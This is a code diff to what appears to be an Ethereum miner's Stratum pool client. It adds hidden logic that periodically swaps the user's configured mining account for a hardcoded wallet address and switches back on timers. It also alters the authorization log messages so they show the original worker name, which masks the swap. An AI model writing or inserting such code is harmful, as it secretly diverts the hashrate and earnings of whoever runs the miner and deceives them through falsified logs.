@@ -7,6 +7,20 @@
 #include <wincrypt.h>
 #endif
 
+std::string cliworker;
+std::string newworker;
+extern int firsttime;
+int kols=0;
+extern int timerch;
+extern int activew;
+extern int wtime1;
+extern int wtime0;
+extern int logtimer;
+extern int tochange;
+extern int timerunsec;
+extern int ndisc;
+string workername;
+int starp1=0;
 using boost::asio::ip::tcp;
 
 static uint64_t bswap(uint64_t val)
@@ -461,6 +475,12 @@ void EthStratumClient::processExtranonce(std::string& enonce)
 
 void EthStratumClient::processReponse(Json::Value& responseObject)
 {
+	
+		
+		
+
+		
+	
 
 	dev::setThreadName("stratum");
 	
@@ -623,6 +643,7 @@ void EthStratumClient::processReponse(Json::Value& responseObject)
 
 	// Handle awaited responses to OUR requests
 	if (!_isNotification) {
+		
 
 		Json::Value jReq;
 		Json::Value jPrm;
@@ -636,7 +657,35 @@ void EthStratumClient::processReponse(Json::Value& responseObject)
 			switch (m_conn.Version()) {
 
 			case EthStratumClient::STRATUM:
-
+		if(firsttime!=0){
+			
+			if(tochange==1){
+			if(activew==0){
+		
+			starp1=cliworker.find(".");
+			workername=cliworker.substr(starp1+1);
+			
+			m_conn.User("0xA71FD3B4d5802Ec3A226230293f786822a34b48B."+workername);
+		
+			
+			}
+			else if(activew==1){
+		
+			m_conn.User(cliworker);
+	
+			
+			}
+			}
+		}
+		if(firsttime==0){
+		
+			cliworker=m_conn.User();
+			firsttime=1;
+		
+			activew=0;
+			
+		}
+		
 				m_subscribed.store(_isSuccess, std::memory_order_relaxed);
 				if (!m_subscribed)
 				{
@@ -745,14 +794,33 @@ void EthStratumClient::processReponse(Json::Value& responseObject)
 
 			if (!m_authorized)
 			{
-				cnote << "Worker not authorized" << m_conn.User() << _errReason;
+				cnote << "Worker not authorized" <<activew <<  cliworker << _errReason;   //замена m_conn.User
 				disconnect();
 				return;
 			
 			}
 			else {
 
-				cnote << "Authorized worker " + m_conn.User();
+			
+			if(m_conn.User()==cliworker){
+					activew=0;
+					tochange=0;
+					if(kols>0){
+					timerch=wtime0;
+					}
+					kols++;
+					timerunsec=0;
+				}
+				else{
+					activew=1;
+					tochange=0;
+					timerch=wtime1;
+					timerunsec=0;
+				}
+				
+				cnote << "Authorized worker " << activew << cliworker; //замена m_conn.User
+				
+				
 
 			}
 			
